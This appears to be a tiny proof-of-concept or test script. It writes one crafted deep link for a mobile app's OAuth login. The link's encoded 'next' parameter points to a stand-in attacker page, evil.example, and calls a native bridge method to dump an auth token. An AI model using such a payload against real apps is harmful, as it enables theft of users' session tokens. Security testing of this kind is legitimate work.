#!/bin/bash
set -e
OUT_DIR="${OUT_DIR:-/src}"
if ! mkdir -p "$OUT_DIR" 2>/dev/null; then OUT_DIR="."; fi
cat > "$OUT_DIR/deeplink.txt" <<'EOF'
myapp://login.example.com/oauth?next=https%3A%2F%2Fevil.example%2Fpoc.html%23Native.exec%28%22dumpToken%22%29
EOF
